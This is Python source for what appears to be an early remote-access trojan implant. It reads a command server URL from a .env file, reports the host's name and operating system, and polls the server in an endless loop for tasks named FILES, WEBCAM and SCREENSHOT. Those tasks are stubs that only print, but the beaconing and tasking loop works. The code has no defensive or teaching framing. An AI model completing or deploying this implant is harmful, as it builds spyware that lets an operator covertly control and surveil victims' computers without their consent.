
from dotenv import load_dotenv
import os
import requests
import time 
import socket
import platform


class Agent():
    
    def __init__(self): # loads up settings from .env
        
        load_dotenv()
        
        try:
            self.pointurl = os.getenv("URL")
            if self.pointurl!=None: print(f"[+] URL LOADED {self.pointurl}")
            else: raise ValueError("Error in pointurl setup")
            
            self.id = os.getenv("AGENT_ID")
            if self.id!=None: print(f"[+] ID LOADED: {self.id}")
            else: raise ValueError("Error in agentID setup")
            
            self.heartbeat = int(os.getenv("HEARTBEAT"))
            if self.heartbeat!=None: print(f"[+] HEARTBEAT LOADED: {self.heartbeat}")
            else: raise ValueError("Error in heartbeat setup")
            
            print("[OK] Setup completed")
        
        except ValueError as e:
            print(f"[-] FATAL ERROR: {e}")
     
me = Agent()
       
    
def handle_task(tsk):
    pass
 
def connect(url):
    agent_id = me.id
    name = socket.gethostname()
    os_name = platform.system()

    while True:
        try:
            res = requests.post(
                url + "/info",
                json={
                    "id": agent_id,
                    "os": os_name,
                    "name": name
                },
                timeout=5
            )

            if res.status_code == 200:
                print("[+] Connected to server")
                return True

            print(f"[-] Server returned status: {res.status_code}")

        except requests.exceptions.ConnectionError:
            print("[-] Cannot connect to server")

        except requests.exceptions.Timeout:
            print("[-] Server timeout")

        time.sleep(3)

def task_check(url):
    try:
        res = requests.post(url+"/tasks", json={"id" : me.id}, timeout=5)
        data = res.json()
        task = data.get("task")
        if task == "NONE": return False
        elif task == "FILES": print("FILES")
        elif task == "WEBCAM": print("WEBCAM")
        elif task == "SCREENSHOT": print("SCREENSHOT")
        elif task == "WHO": connect(url)
        
    except requests.exceptions.ConnectionError:
        print("[-] Cannot connect to server")
        return False

    except requests.exceptions.Timeout:
        print("[-] Server timeout")
        return False

    except Exception as e:
        print(f"[-] Task check failed: {e}")
        return False
    
    
    
        
def active_loop(pointurl, agentID, heartbeat):
    connect(pointurl)
    
    while True:
        task_check(pointurl)
        time.sleep(heartbeat)
    


active_loop(me.pointurl, me.id, me.heartbeat)